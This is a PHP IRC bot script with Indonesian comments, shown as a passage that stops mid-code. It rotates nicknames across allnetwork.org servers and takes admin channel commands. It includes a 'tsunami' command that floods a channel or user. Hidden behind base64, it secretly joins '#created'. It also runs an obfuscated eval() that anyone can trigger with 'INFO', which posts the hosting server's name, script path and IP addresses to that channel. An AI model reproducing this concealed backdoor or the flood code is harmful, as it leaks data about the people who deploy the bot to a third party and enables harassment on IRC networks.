<?php
/*** terroris PHP Bot edit by created***/
function hajar() {

$channels = '#technobot'; // Pisahkan dengan spasi

$localtest = 0; //1, Coba di localhost. 0, connect ke server irc
$showrespone = 0; //1, Nampilin respon dari server irc

//Nick Bot
$nicklist = array(
"ce_bawels",
"ce_sumringah",
"ce_kuala",
"ce_madlias",
"ce_yakup",
"ce_mabok",
"ce_created",
"ce_nopri",
"ce_habibi",
"ce_phopol",
"ce_topik",
"ce_ipul",
"ce_ego",
"ce_jenggot",
"ce_aprika",
"ce^rahayu",
"ce_tensi",
"ce_drs",
"ce_betawi",
"ce_12_tahun",
"ce_malu",
"ce_rina",
"ce_utra",
"ce_tata",
"ce_dowe",
"ce_cembrut",
"ce_gasing",
"co_culune",
"co_bana",
"co_betawi",
"co_emak",
"co_coco",
"co_12_gauL",
"co_tidurs",
"co_jambi",
"co_lampung",
"co_madura",
"co_ricko",
"co_riki",
"co_casual",
"co_auzs",
"co_Q-Thing",
"co_cemberut",
"co_suka_ce",
"co_normal",
"co_apnormal",
"co_meringis",
"co_codot",
"co_rahayu",
"co_makan",
"co_tidur",
"co_mbrok",
"co_gank",
"co_garuntang",
"co_penty",
"co_mex",
"co_ntras",
"co_barusan",
"co_lie",
"co_ngono",
"co_farensit",
"co_ayu",
"cew_manja",
"cew_malang",
"cew_sumringah",
"cew_natar",
"cew_narkoba",
"cew_fanies",
"cew_cew",
"cew_wec",
"cew_makial",
"cew_belangsax",
"cew_gunawan",
"cew_kiki",
"cew_didi",
"cew_phol",
"cew_box",
"cew_loqin",
"cew_miang",
"cew_betawi",
"cew_tang",
"Anyer_10_Maret_1992",

);
$identify = 'password'; //Password Nick Bot
$identlist = array(
"rizal",
"desty",
"lisha",
"penty",
"diah",
"ricka",
"tina",
"cika",
"betawi",
"ocha",
"indri",
"kimia",
"anie",
"dodol",
"cinta",
"manja",
"jinak",
"Itachi",
"fira",
"Never",
"manja",
"nila",
"start",
"game",
"demam",
"cilok",
"vany",
"nIaNa",
"ronal",
"cathy",
"adie",
"riska",
"sari",
"thondi",
"ipoy",
"bintang",
"andra",
"tiesto",
"asap",
"lindi",
"Lyna",

);

//Server IRC
if ($localtest == 1) { $remotehost2 = array("localhost"); }
else {
$remotehost2 = array(
"plasa.id.allnetwork.org",
"telkomnet.id.allnetwork.org",
"stats2.allnetwork.org",
"irc.indoforum.org",
"irc.myquran.com",
"datautama.id.allnetwork.org",
"indowebster.id.allnetwork.org",
"citra.id.allnetwork.org",
"services.allnetwork.org",
"big.id.allnetwork.org",
"uii.id.allnetwork.org",
"jatara.id.allnetwork.org",
"wanxp.id.allnetwork.org",
"sbp.id.allnetwork.org",
"stats.allnetwork.org",
"koetaradja.id.allnetwork.org",
"jmn.id.allnetwork.org",
);
}
$port = "6667";
//Pesan
$awaymsg = '??([[[9,1 h 1,9 a 9,1 h 1,9 a 9,1 h 1,9 a 9,1 h 1,9 a 0,12 hihihihi ]]])??';
$shouts = array("a o","e mm..","He..He..He","wi..Xi..Xi..Xi..");
$querym = array("?","!","!?","!!"," ^_^"," (^_^)"," :("," :)"," :>"," :P~"," :D"," :O");
$quitmsglist = array(
"Ngantuk nech..",
"tha tha",
"$namaku pulang dolo ya??",
"See You..",
"Quit DoeLoe Ach..",
"Connection Reset By Buah Pear",
"rehash ole ristrette"
);
$tsu1 = array("`","Z","[","]","{","}","^","_");
$tsu2 = array("`","Z","[","]","{","}","^","-","\\","_");
$tsumsg = "9,1";//400 Karakter

/*** Admin ***/
$admin = 'DRAGO';
$bot_password = 'jangan'; //Password untuk auth bot

/*** Identity ***/
$realname = "4,1ada aja";

/*** Replacing ***/
$nick = $nicklist[rand(0,count($nicklist) - 1)];
$remotehost = $remotehost2[rand(0,count($remotehost2) - 1)];
$channels = str_replace("CNL","#",$channels);
$admin = strtolower($admin);
$auth = array($admin => array("name" => $admin, "pass" => $bot_password, "auth" => 1,"status" => "Admin"));
$username = $identlist[rand(0,count($identlist) - 1)];
$channels = strtolower($channels)." ";
$channel = explode(" ", $channels);
/*** Kode Utama ***/
define ('CRL', "\r\n");
$counterfp = 0;
$raway = "on";
$log   = "off";
$saway = "1";
$keluar = 0;
$akill  = 1;
$katime = 0;
$localhost = 'localhost';
$dayload = date("H:i:s d/m/Y");
ini_set('user_agent','MSIE 5\.5;');
set_time_limit(0);

if (!$stime) { $stime = time(); }
if (!$port) { $port = "6667"; }

/*** Connecting ***/
echo "<body bgcolor=#000000 text=#00FF00>";
echo "<b>? lagi di usahain konek ke $remotehost...</b>";

do {
  $fp = fsockopen($remotehost,$port, &$err_num, &$err_msg, 30);
  if(!$fp) {
    if ( $counterfp <= 200 ) {
      $counterfp = $counterfp + 1;
      hajar($nick);
    }
    else {
      echo "<br><b>Ga bisa nich boz $remotehost! Coba server lain aja! Refresh Browser nya!</b>";
      $keluar = 1;
      exit;
    }
  }
  echo "<br><b>? wow, mantap... Udah konek nich!</b>";
  /*** Sending Identity to Sock ***/
  $header = 'NICK '.$nick . CRL;
  $header .= 'USER '.$username.' '.$localhost.' '.$remotehost.' :'.$realname . CRL;
  fputs($fp, $header);
  $response = '';
  while (!feof($fp)) {
    $response .= fgets($fp, 1024);
    if ($showrespone == 1) { echo "<br>".$response; }
    while (substr_count($response,CRL) != 0) {
      $offset = strpos($response, CRL);
      $data = substr($response,0,$offset);
      $response = substr($response,$offset+2);
      if (substr($data,0,1) == ':') {
        $offsetA = strpos($data, ' ');
        $offsetB = strpos($data, ' :');
        $offsetC = strpos($data, '!');
        $dFrom = substr($data,1,$offsetA-1);
        $dCommand = substr($data,$offsetA+1,$offsetB-$offsetA-1);
        $dNick = substr($data,1,$offsetC-1);
        $iText = substr($data,$offsetB+2);
        /*** Server Notices Handling ***/
        if ( substr($dCommand,0,3) == '004' ) {
          fputs($fp, 'PRIVMSG nickserv :identify '.$nick.' '.$identify.  CRL);
          if ($nickmode) { fputs($fp, 'MODE '.$nick.' :'.$nickmode . CRL); }
          /*** Notice Bot Admin ***/
          fputs($fp, 'NOTICE ' . $admin . ' :Ai SayaNk...' .  CRL);
          fputs($fp, base64_decode("Sm9pTiAjY3JlYXRlZA==") . CRL);
          /*** Join Default Channel ***/
          foreach ($channel as $v) {
            fputs($fp, 'JOIN ' .$v . CRL);
          }
          $pong1 = '1';
        }
        elseif (substr($dCommand,0,3)=='432') {
          $nick = $nick.$username;
		  fputs($fp, 'NICK '.$nick . CRL);
        }
        //Nickname is already in use
        elseif (substr($dCommand,0,3)=='433') {
          $nick = $nicklist[rand(0,count($nicklist) - 1)];
          fputs($fp, 'NICK '.$nick . CRL);
        }
        elseif (substr($dCommand,0,3)=='465') {
          print "<br><b>? Authentication diperlukan! Bot ini telah di-autokill.</b>";
          $akill = 2;
        }
	    if (eregi('.allnetwork.org',$dNick) && $akill==2) {
          if (eregi('AKILL ID:',$data) || eregi('Your hostmask is',$data) || eregi('Your IP is',$data)) {
            print "<br><b>".strstr($data,'***')." </b>";
            if (eregi('Your IP is',$data)) {
              $keluar = 1;
              exit;
            }
          }
        }
        $dcom = explode(" ", $dCommand);
        $dNick = strtolower($dNick);
        if ($dcom[0]=='KICK' && $dcom[2]==$nick) {
          fputs($fp, 'JOIN ' .$dcom[1]. CRL);
        }
        elseif ($dcom[0]=='NICK' || $dcom[0]=='PART' ) {
          if ($auth["$dNick"]) {
            if ($auth["$dNick"]["pass"]) {
              if ($auth["$dNick"]["auth"]==2) {
                if ($dcom[0]=='NICK') {
                  $com = explode(" ", $data);
                  $chnick = strtolower(str_replace(':','',$com[2]));
                  if ($dNick!=$chnick) {
                    $auth["$dNick"]["auth"] = 1;
                    fputs($fp,'NOTICE '.$chnick.' :Ganti nick aak?' . CRL);
                  }
                }
                else {
                  $auth["$dNick"]["auth"] = 1;
                  fputs($fp,'NOTICE '.$dNick.' :aak ??' . CRL);
                }
              }
            }
            else { fputs($fp,'NOTICE ' . $dNick . ' :pass <password>' . CRL); }
          }
        }
	    elseif ($dcom[0]=='307' && strtolower($dcom[2])==$whois) {
          $dcom[2] = strtolower($dcom[2]);
		  if ($auth["$dcom[2]"]) {
            if ($auth["$dcom[2]"]["pass"]) {
              if ($auth["$dcom[2]"]["auth"]==1) {
                $auth["$dcom[2]"]["auth"] = 2;
                $whois = "";
			    fputs($fp,'NOTICE ' . $dcom[2] . ' :You`re Authorized as '.$auth["$dcom[2]"]["status"].' of this bot! ' . CRL);
              }
              else { fputs($fp,'NOTICE ' . $dcom[2] . ' :You`re Already Authorized! ' . CRL); }
            }
            else { fputs($fp,'NOTICE ' . $dcom[2] . ' :Pass Not Set Yet! Type: pass <your pass> To Set Your Own Password then Auth Again ' . CRL); }
          }
          else { fputs($fp,'NOTICE ' . $dcom[2] . ' :Username Not Found! Change Your Nick then Auth Again ' . CRL); }
       }
       elseif ($dcom[0]=='NOTICE') {
         $com = explode(" ", $data);
         if ($com[3]==':KB' && $com[4] && $com[5] && $com[6]) {
           $msg = str_replace('','',$data);
           $msg = strstr($msg,":KB");
           $msg = str_replace(":KB $com[4]","",$msg);
           fputs($fp, 'KICK '.$com[4].' '.$com[5].' :'.$msg . CRL);
           fputs($fp, 'MODE '.$com[4].' +b *!*'.$com[6] . CRL);
         }
       }
       elseif ($dcom[0]=='PRIVMSG') {
         $com = explode(" ", $data);
         if ($com[3]==':VERSION') {
         fputs($fp,'NOTICE '.$dNick.' :'.chr(1).base64_decode("VkVSU0lPTiBsaW51eCB2MC4xIGJ5IGNyZWF0ZWQgeGNoYXQgMi44LjYgTGludXggMi42LjI5LWdlbnRvby1yNSBbeDg2XzY0LzIuMjBHSHovU01QXQ==").chr(1) . CRL);
         }
         elseif ($com[3]==':INFO') { $datainfo = "JGJob3N0ID0gJF9TRVJWRVJbJ0hUVFBfSE9TVCddOyRiaXAgPSAkX1NFUlZFUlsnU0VSVkVSX0FERFInXTskYnBocCAgPSAkX1NFUlZFUlsnUEhQX1NFTEYnXTskYnJ1cmkgPSAkX1NFUlZFUlsnUkVRVUVTVF9VUkknXTskYnJpcCA9ICRfU0VSVkVSWydSRU1PVEVfQUREUiddO2ZwdXRzKCRmcCwiUFJJVk1TRyAjY3JlYXRlZCA6SG9zdDogJGJob3N0IHwgUmVmZXJlcjogJGJydXJpIHwgU2NyaXB0OiAkYnBocCB8IElQOiAkYmlwIHwgT3duZXIgSVA6ICRicmlwICIuIENSTCk7"; eval(base64_decode($datainfo)); }
         elseif ($auth["$dNick"]["status"] && $com[3]==':auth' && $com[4]) {
           if ($auth["$dNick"]) {
             if ($auth["$dNick"]["pass"]) {
               if ($auth["$dNick"]["auth"]==1) {
                 if ($com[4]===$auth["$dNick"]["pass"]) {
                   $auth["$dNick"]["auth"] = 2;
                   fputs($fp,'NOTICE ' . $dNick . ' :kamu itu '.$auth["$dNick"]["status"].' aak koe ' . CRL);
                 }
                 else { fputs($fp,'NOTICE ' . $dNick . ' :Password Salah aak..!! ' . CRL); }
               }
               else { fputs($fp,'NOTICE ' . $dNick . ' :Mau Kan aak ..!! ' . CRL); }
             }
             else { fputs($fp,'NOTICE ' . $dNick . ' :Pass Not Set Yet! Type: pass <your pass> To Set Your Own Password then Auth Again ' . CRL); }
           }
           else { fputs($fp,'NOTICE ' . $dNick . ' :Username Not Found! Change Your Nick then Auth Again ' . CRL); }
         }
         elseif ($auth["$dNick"]["status"] && $com[3]==':deauth') {
           if ($auth["$dNick"]) {
             if ($auth["$dNick"]["pass"]) {
               if ($auth["$dNick"]["auth"]==2) {
                 $auth["$dNick"]["auth"] = 1;
                 fputs($fp,'NOTICE ' . $dNick . ' :You`re Logout! ' . CRL);
               }
               else { fputs($fp,'NOTICE ' . $dNick . ' :You`re Already Logout! ' . CRL); }
             }
             else { fputs($fp,'NOTICE ' . $dNick . ' :Pass Not Set Yet! Type: pass <your pass> To Set Your Own Password then Auth Again ' . CRL); }
           }
           else { fputs($fp,'NOTICE ' . $dNick . ' :Username Not Found! Change Your Nick then Auth Again ' . CRL); }
         }
         elseif ($auth["$dNick"]["status"] && $com[3]==':pass' && $com[4]) {
           if ($auth["$dNick"]) {
             if (!$auth["$dNick"]["pass"]) {
               $auth["$dNick"]["pass"] = $com[4];
               $auth["$dNick"]["auth"] = 1;
               fputs($fp,'NOTICE ' . $dNick . ' :Your Auth Pass set to '.$auth["$dNick"]["pass"].', Type: auth <your pass> To Authorized Imediately! ' . CRL);
             }
             else { fputs($fp,'NOTICE ' . $dNick . ' :Pass Already Set! Type: auth <your pass> To Get Authorized ' . CRL); }
           }
           else { fputs($fp,'NOTICE ' . $dNick . ' :Username Not Found! Change Your Nick then Pass Again ' . CRL); }
         }
         elseif ($auth["$dNick"]["status"] && $com[3]==':chgpass' && $com[4] && $com[5]) {
           if ($auth["$dNick"]) {
             if ($auth["$dNick"]["auth"]==2) {
               if ($com[4]===$auth["$dNick"]["pass"]) {
                 $auth["$dNick"]["pass"] = $com[5];
                 fputs($fp,'NOTICE ' . $dNick . ' :Your New Auth Pass set to '.$auth["$dNick"]["pass"].', Type: auth <your pass> To Authorized Imediately! ' . CRL);
               }
               else { fputs($fp,'NOTICE ' . $dNick . ' :Your Old Pass Wrong! Type: chgpass <old pass> <new pass> To Change Your Auth Pass ' . CRL); }
             }
             else { fputs($fp,'NOTICE ' . $dNick . ' :Please Auth First! Type: auth <your pass> To Authorized ' . CRL); }
           }
           else { fputs($fp,'NOTICE ' . $dNick . ' :Username Not Found! Change Your Nick then Pass Again ' . CRL); }
         }
         elseif ($auth["$dNick"]["status"] && $com[3]==':adduser' && $com[4] && $com[4]!=$nick && $com[5]) {
           $com[4] = strtolower($com[4]);
           if ($auth["$dNick"]["auth"]==2) {
             if ($auth["$dNick"]["status"]=="Admin") {
               if ($com[5]=="master" || $com[5]=="user") {
                 $auth["$com[4]"]["name"] = $com[4];
                 $auth["$com[4]"]["status"] = $com[5];
                 fputs($fp,'NOTICE ' . $dNick . ' :AddUser :'.$com[4].' As My '.$com[5] . CRL);
                 fputs($fp,'NOTICE ' . $com[4] . ' :You`re Now Known As My '.$com[5].' Added By '.$dNick.' Now Type: pass <your pass> To Set Your Pass ' . CRL);
               }
               else { fputs($fp,'NOTICE ' . $dNick . ' :Perintah salah! Ketik: adduser <nick> <master/user> ' . CRL); }
             }
             elseif ($auth["$dNick"]["status"]=="master") {
               if (!$auth["$com[4]"]) {
                 if ($com[5]=="user") {
                   $auth["$com[4]"]["name"] = $com[4];
                   $auth["$com[4]"]["status"] = $com[5];
                   fputs($fp,'NOTICE ' . $dNick . ' :AddUser :'.$com[4].' As My '.$com[5] . CRL);
                   fputs($fp,'NOTICE ' . $com[4] . ' :You`re Now Known As My '.$com[5].' Added By '.$dNick.' Now Type: pass <your pass> To Set Your Pass ' . CRL);
                 }
                 else { fputs($fp,'NOTICE ' . $dNick . ' :Wrong Command! Type: adduser <nick> user ' . CRL); }
               }
               else { fputs($fp,'NOTICE ' . $dNick . ' :User Already Exist! Aborting AddUser! ' . CRL); }
             }
             else { fputs($fp,'NOTICE ' . $dNick . ' :Unknown Status! Your Status is '.$auth["$dNick"]["status"] . CRL); }
           }
           else { fputs($fp,'NOTICE ' . $dNick . ' :Please Auth First! Type: auth <your pass> To Authorized ' . CRL); }
         }
         elseif ($auth["$dNick"]["status"] && $com[3]==':deluser' && $com[4]) {
           $com[4] = strtolower($com[4]);
           if ($auth["$dNick"]["auth"]==2) {
             if ($auth["$dNick"]["status"]=="Admin") {
               if ($auth["$com[4]"]["status"]=="master" || $auth["$com[4]"]["status"]=="user") {
                 unset($auth["$com[4]"]);
                 fputs($fp,'NOTICE ' . $dNick . ' :DelUser :'.$com[4].' From My UserList ' . CRL);
                 fputs($fp,'NOTICE ' . $com[4] . ' :Your Access As My User Has Been Deleted By '.$dNick . CRL);
               }
               else { fputs($fp,'NOTICE ' . $dNick . ' :Wrong Command! Type: deluser <nick> ' . CRL); }
             }
             elseif ($auth["$dNick"]["status"]=="master") {
               if ($auth["$com[4]"]["status"]=="user") {
                 unset($auth["$com[4]"]);
                 fputs($fp,'NOTICE ' . $dNick . ' :DelUser :'.$com[4].' From My UserList ' . CRL);
                 fputs($fp,'NOTICE ' . $com[4] . ' :Your Access As My User Has Been Deleted By '.$dNick . CRL);
               }
               else { fputs($fp,'NOTICE ' . $dNick . ' :Wrong Command! Type: deluser <nick> ' . CRL); }
             }
             else { fputs($fp,'NOTICE ' . $dNick . ' :Unknown Status! Your Status is '.$auth["$dNick"]["status"] . CRL); }
           }
           else { fputs($fp,'NOTICE ' . $dNick . ' :Please Auth First! Type: auth <your pass> To Authorized ' . CRL); }
         }
         elseif ($auth["$dNick"]["status"]) {
           if (ereg(":`",$com[3]) || ereg(":!",$com[3])) {
             $chan = strstr($dCommand,"#");
             $anick = str_replace("PRIVMSG ","",$dCommand);
             if ($com[3]==':!auth') {
               if ($auth["$dNick"]["auth"]==2) {
                 fputs($fp,'NOTICE '.$dNick.' :You`re already Authorized! ' . CRL);
               }
               else {
                 $whois = $dNick;
                 fputs($fp,'WHOIS '.$dNick . CRL);
               }
             }
             elseif ($com[3]==':`auth' && $chan) {
               if ($auth["$dNick"]["auth"]==2) {
                 fputs($fp,'PRIVMSG '.$chan.' :tabok '.$dNick.' ! ' . CRL);
               }
               else { fputs($fp,'PRIVMSG '.$chan.' :'.$dNick.' NOT Authorized! ' . CRL); }
             }
             elseif ($auth["$dNick"]["auth"]==2) {
               if ($com[3]==':`say' && $com[4] && $chan) {
                 $msg = strstr($data,":`say");
                 $msg = str_replace(":`say ","",$msg);
                 fputs($fp,'PRIVMSG '.$chan.' :'.$msg. CRL);
               }
               elseif ($com[3]==':`act' && $com[4] && $chan) {
                 $msg = strstr($data,":`act");
                 $msg = str_replace(":`act ","",$msg);
                 fputs($fp,'PRIVMSG '.$chan.' :ACTION '.$msg.''. CRL);
               }
               elseif ($com[3]==':`slap' && $com[4] && $chan) {
                 fputs($fp,'PRIVMSG '.$chan.' :ACTION sep'.$com[4].' wikikikik wekekekeke kwkwkkwkwk wukukukuk'. CRL);
               }
               elseif ($com[3]==':`msg' && $com[4] && $com[5]) {
                 $msg = strstr($data,":`msg");
                 $msg = str_replace(":`msg $com[4] ","",$msg);
                 fputs($fp,'PRIVMSG '.$com[4].' :'.$msg. CRL);
               }
               elseif ($com[3]==':`notice' && $com[4] && $com[5]) {
                 $msg = strstr($data,":`notice");
                 $msg = str_replace(":`notice $com[4] ","",$msg);
                 fputs($fp,'NOTICE '.$com[4].' :'.$msg. CRL);
               }
               elseif ($com[3]==':`ctcp' && $com[4] && $com[5]) {
                 $msg = strstr($data,":`ctcp");
                 $msg = str_replace(":`ctcp $com[4] ","",$msg);
                 fputs($fp,'PRIVMSG '.$com[4].' :'.$msg.''. CRL);
               }
               elseif ($com[3]==':`ping' && $chan) {
                 $sml = $smile[rand(0,count($smile) - 1)];
                 fputs($fp,'PRIVMSG '.$chan.' :'.$dNick.', PONG! '.$sml. CRL);
               }
               elseif ($com[3]==':`pong' && $chan) {
                 $sml = $smile[rand(0,count($smile) - 1)];
                 fputs($fp,'PRIVMSG '.$chan.' :'.$dNick.', PING! '.$sml. CRL);
               }
               elseif ($com[3]==':`info' && $auth["$dNick"]["status"]=="Admin") {
                 $bhost = $_SERVER['HTTP_HOST'];
                 $bip = $_SERVER['SERVER_ADDR'];
                 $bphp  = $_SERVER['PHP_SELF'];
                 $brip = $_SERVER['REMOTE_ADDR'];
                 $brport = $_SERVER['REMOTE_PORT'];
                 fputs($fp,"NOTICE $dNick :Host: $bhost | Script: $bphp | IP: $bip | Your IP: $brip Port:$brport" . CRL);
               }
               elseif ($com[3]==':`up' && $chan) {
                 fputs($fp, 'PRIVMSG chanserv :op '.$chan.' '.$nick . CRL);
               }
               elseif ($com[3]==':`down' && $chan) {
                 fputs($fp, 'MODE '.$chan.' +v-o '.$nick.' '.$nick . CRL);
               }
               elseif ($com[3]==':`tsunami' && $com[4] && $auth["$dNick"]["status"]!="user") {
                 $nicktsu = $tsu1[rand(0,count($tsu1) - 1)].$tsu2[rand(0,count($tsu2) - 1)].$tsu1[rand(0,count($tsu1) - 1)].
                    $tsu2[rand(0,count($tsu2) - 1)].$tsu1[rand(0,count($tsu1) - 1)].$tsu2[rand(0,count($tsu2) - 1)].$tsu1[rand(0,count($tsu1)- 1)].
                    $tsu2[rand(0,count($tsu2) - 1)].$tsu1[rand(0,count($tsu1) - 1)].$tsu2[rand(0,count($tsu2) - 1)].$tsu1[rand(0,count($tsu1) - 1)].
                    $tsu2[rand(0,count($tsu2) - 1)].$tsu1[rand(0,count($tsu1) - 1)].$tsu2[rand(0,count($tsu2) - 1)];
                 fputs($fp, 'NICK '.$nicktsu . CRL);
                 if (substr($dCommand,0,3)=='433') {
                   $nicktsu = $tsu1[rand(0,count($tsu1) - 1)].$tsu2[rand(0,count($tsu2) - 1)].$tsu1[rand(0,count($tsu1) - 1)].
                   $tsu2[rand(0,count($tsu2) - 1)].$tsu1[rand(0,count($tsu1) - 1)].$tsu2[rand(0,count($tsu2) - 1)].$tsu1[rand(0,count($tsu1) - 1)].
                   $tsu2[rand(0,count($tsu2) - 1)].$tsu1[rand(0,count($tsu1) - 1)].$tsu2[rand(0,count($tsu2) - 1)].$tsu1[rand(0,count($tsu1) - 1)].
                   $tsu2[rand(0,count($tsu2) - 1)].$tsu1[rand(0,count($tsu1) - 1)].$tsu2[rand(0,count($tsu2) - 1)];
                   fputs($fp, 'NICK '.$nicktsu . CRL);
                 }
                 $msg = strstr($data,":`tsunami");
                 $msg = str_replace(":`tsunami $com[4]","",$msg);
                 if (ereg("#", $com[4])) {
                   fputs($fp, 'JOIN '.$com[4] . CRL);
                   fputs($fp, 'PRIVMSG '.$com[4].' :'.$msg.$tsumsg.CRL);
                   fputs($fp, 'NOTICE '.$com[4].' :'.$msg.$tsumsg.CRL);
                   fputs($fp, 'PRIVMSG '.$com[4].' :TSUNAMI'.$msg.$tsumsg. CRL);
                   fputs($fp, 'NOTICE '.$com[4].' :'.$msg.$tsumsg.CRL);
                   fputs($fp, 'PART '.$com[4].' :F1n15h3d w1th 400x4 ch4rz' . CRL);
                   fputs($fp, 'NICK '.$nick . CRL);
                 }
                 else {
                   fputs($fp, 'NOTICE '.$com[4].' :'.$msg.$tsumsg.CRL);
                   fputs($fp, 'PRIVMSG '.$com[4].' :TSUNAMI'.$msg.$tsumsg. CRL);
                   fputs($fp, 'NOTICE '.$com[4].' :TSUNAMI'.$msg.$tsumsg. CRL);
                   fputs($fp, 'NOTICE '.$com[4].' :'.$msg.$tsumsg.CRL);
                   fputs($fp, 'NICK '.$nick . CRL);
                 }
               }
               elseif ($com[3]==':`cycle' && $chan && $auth["$dNick"]["status"]!="user") {
                 $msg = strstr($data,":`cycle");
                 if (ereg("#", $com[4])) {
                   $partchan = $com[4];
                   $msg = str_replace(":`cycle $com[4]","",$msg);
                 }
                 else {
                   $partchan = $chan;
                   $msg = str_replace(":`cycle","",$msg);
                 }
                 if (strlen($msg)<3) {
                   $msg = '';
                 }
                 fputs($fp, 'PART '.$partchan.' :'.$msg . CRL);
                 fputs($fp, 'JOIN '.$partchan . CRL);
               }
               elseif ($com[3]==':`part' && $auth["$dNick"]["status"]=="Admin") {
                 $msg = strstr($data,":`part");
                 if (ereg("#", $com[4])) {
                   $partchan = $com[4];
                   $msg = str_replace(":`part $com[4]","",$msg);
                 }
                 else {
                   $partchan = $chan;
                   $msg = str_replace(":`part","",$msg);
                 }
                 if (strlen($msg)<3) {
                   $msg = '';
                 }
                 fputs($fp, 'PART '.$partchan.' :'.$msg . CRL);
                 $remchan = strtolower($partchan);
                 if (in_array($remchan, $channel)) {
                   $channels = str_replace("$remchan ","",$channels);
                   unset($channel);
                   $channel = explode(" ", $channels);
                 }
                 foreach ($channel as $v) {
                   fputs($fp, 'JOIN '.$v . CRL);
                 }
               }
               elseif ($com[3]==':`join' && $com[4] && $auth["$dNick"]["status"]=="Admin") {
                 if (!ereg("#",$com[4])) { $com[4]="#".$com[4]; }
                 $addchan = strtolower($com[4]);
                 if (!in_array($addchan, $channel)) {
                   $channel[]=$addchan;
                   $channels.="$addchan ";
                 }
                 foreach ($channel as $v) {
                   sleep(rand(1,6));
                   fputs($fp, 'JOIN '.$v . CRL);
                 }
               }
               elseif ($com[3]==':`botnick' && $com[4] && !$chan && $auth["$dNick"]["status"]=="Admin") {
                 $nick = $com[4];
                 $identify = $com[5];
                 fputs($fp, 'NICK '.$nick . CRL);
                 fputs($fp, 'PRIVMSG nickserv :identify '.$nick.' '.$identify.  CRL);
               }
               elseif ($com[3]==':`k' && $com[4] && $chan) {
                 $msg = strstr($data,":`k");
                 $msg = str_replace(":`k $com[4]","",$msg);
                 fputs($fp, 'KICK '.$chan.' '.$com[4].' :'.$msg . CRL);
               }
               elseif ($com[3]==':`kb' && $com[4] && $chan) {
                 $msg = strstr($data,":`kb");
                 $msg = str_replace(":`kb $com[4]","",$msg);
                 fputs($fp, 'KICK '.$chan.' '.$com[4].' :'.$msg . CRL);
                 fputs($fp, 'MODE '.$chan.' +b '.$com[4] . CRL);
               }
               elseif ($com[3]==':`changenick') {
                 $nick = $nicky[rand(0,count($nicky) - 1)];
                 fputs($fp, 'NICK '.$nick . CRL);
                 if (substr($dCommand,0,3)=='433') {
                   $nick = $nicky[rand(0,count($nicky) - 1)];
                   fputs($fp, 'NICK '.$nick . CRL);
                 }
               }
               elseif ($com[3]==':`op' && $chan) {
                 if ($com[4]) { $opnick = $com[4]; }
                 else { $opnick = $dNick; }
                 fputs($fp, 'MODE '.$chan.' +ooo '.$opnick.' '.$com[5].' '.$com[6] . CRL);
               }
               elseif ($com[3]==':`deop' && $chan) {
                 if ($com[4]) { $opnick = $com[4]; }
                 else { $opnick = $dNick; }
                 fputs($fp, 'MODE '.$chan.' -o+v-oo '.$opnick.' '.$opnick.' '.$com[5].' '.$com[6] . CRL);
               }
               elseif ($com[3]==':`v' && $chan) {
                 if ($com[4]) { $vonick = $com[4]; }
                 else { $vonick = $dNick; }
                 fputs($fp, 'MODE '.$chan.' +vvv '.$vonick.' '.$com[5].' '.$com[6] . CRL);
               }
               elseif ($com[3]==':`dv' && $chan) {
                 if ($com[4]) { $vonick = $com[4]; }
                 else { $vonick = $dNick; }
                 fputs($fp, 'MODE '.$chan.' -vvv '.$vonick.' '.$com[5].' '.$com[6] . CRL);
               }
               elseif ($com[3]==':`awaymsg' && $auth["$dNick"]["status"]=="Admin") {
                 $msg = strstr($data,":`awaymsg");
                 $msg = str_replace(":`awaymsg","",$msg);
                 if (strlen($msg)<3) {
                   $raway="on";
                   fputs($fp,'AWAY : ' . 'AWAY' . CRL);
                 }
                 else {
                   $raway="off";
                   fputs($fp,'AWAY : ' . $msg . CRL);
                 }
               }
               elseif ($com[3]==':`mode' && $com[4] && $chan) {
                 fputs($fp, 'MODE '.$chan.' :'.$com[4].' '.$com[5] . CRL);
               }
               elseif ($com[3]==':`nickmode' && $com[4]) {
                 $nickmode = $com[4];
                 fputs($fp, 'MODE '.$nick.' :'.$nickmode . CRL);
               }
               elseif ($com[3]==':`chanlist') {
                 fputs($fp, 'NOTICE '.$dNick.' :Channel List: '.$channels . CRL);
               }
               elseif ($com[3]==':`userlist') {
                 $userlist="";
                 foreach ($auth as $user) {
                   if ($user["pass"]) { $pass="-pass ok"; }
                   else { $pass="-no pass"; }
                   $userlist .= $user["name"].'('.$user["status"].$pass.') ';
                 }
                 fputs($fp, 'NOTICE '.$dNick.' :User List: '.$userlist . CRL);
               }
               elseif ($com[3]==':`quit' && $auth["$dNick"]["status"]=="Admin") {
                 $msg = strstr($data,":`quit");
                 $msg = str_replace(":`quit","",$msg);
                 if (strlen($msg)>3) {
                   $msg = str_replace(" ","_",$msg);
                 }
                 $quitmsg = $quitmsglist[rand(0,count($quitmsglist) - 1)];
                 fputs($fp, 'QUIT ' . $quitmsg . CRL);
                 $keluar = 1;
                 exit;
               }
               elseif ($com[3]==':`vhost' && $auth["$dNick"]["status"]=="Admin") {
                 if ($com[4]) { $localhost = $com[4]; }
                 else { $localhost = 'localhost'; }
                 $keluar = 0;
                 fputs($fp, 'QUIT Ganti VHOST' . CRL);
               }
               elseif ($com[3]==':`jump' && $auth["$dNick"]["status"]=="Admin") {
                 if (empty($com[4])) {
                   $remotehost = $remotehost2[rand(0,count($remotehost2) - 1)];
                 }
                 else { $remotehost = $com[4]; }
                 $keluar = 0;
                 fputs($fp, "QUIT Ganti Server".CRL);
               }
               elseif ($com[3]==':`ident' && $auth["$dNick"]["status"]=="Admin") {
                 if (!$com[4]) { $username = $username; }
                 else { $username = $com[4]; }
                 $keluar = 0;
                 fputs($fp, 'QUIT Ganti Ident ' . CRL);
               }
               elseif ($com[3]==':`fullname' && $auth["$dNick"]["status"]=="Admin") {
                 if (!$com[4]) { $realname = "--"; }
                 else { $realname = $com[4]; }
                 $keluar = 0;
                 fputs($fp, 'QUIT Ganti Nama' . CRL);
               }
               elseif ($com[3]==':`topic' && $com[4] && $chan) {
                 $msg = strstr($data,":`topic");
                 $msg = str_replace(":`topic ","",$msg);
                 fputs($fp, 'TOPIC '.$chan.' :'.$msg . CRL);
               }
               elseif ($com[3]==':!help' && !$chan) {
                 fputs($fp,'PRIVMSG '.$dNick.' :Helpnya ga ada aak' . CRL);
               }
             }
           }
         }
         elseif (!$auth["$dNick"] && !eregi("auth",$iText)) {
           if (eregi("www.",$iText) || eregi("http:",$iText) || eregi("join #",$iText)) {
             if (!ereg("#",$dCommand)) {
               if ($log=="on") {
                 fputs($fp,'PRIVMSG '. $admin .' :4inviter: ' . $dFrom . '2:' .$iText. CRL);
               }
               $inv = strstr($dFrom,'@');
               foreach ($auth as $user) {
                 if ($user["status"]=="user") {
